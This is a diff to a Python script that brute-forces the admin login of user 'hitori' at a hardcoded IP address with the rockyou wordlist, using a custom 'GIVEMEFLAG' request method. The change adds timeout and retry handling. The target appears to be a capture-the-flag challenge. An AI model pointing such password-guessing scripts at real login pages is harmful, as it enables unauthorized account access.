@@ -1,5 +1,7 @@
-import requests
 from base64 import b64encode
+import time
+import requests
+from requests.exceptions import ReadTimeout, ConnectTimeout
 
 login_url = 'http://140.115.59.7:12002/admin'
 
@@ -28,10 +30,16 @@ with open('rockyou.txt', 'r', encoding='latin-1') as rockyou:
         line = line.strip()
         print(f"try {count} password: {line}")
         set_login("hitori", line)
-        response = requests.request("GIVEMEFLAG", login_url, headers=login_headers)
-    
+        while True:
+            try:
+                response = requests.request("GIVEMEFLAG", login_url, headers=login_headers, timeout=10)
+                break
+            except ReadTimeout:
+                print("read timeout, retry")
+            except ConnectTimeout:
+                print("connect timeout, retry")
         if 'You have not been verified' not in response.text:
             print(f"found password!: {line}")
             break
-
+        # time.sleep(0.5)
 
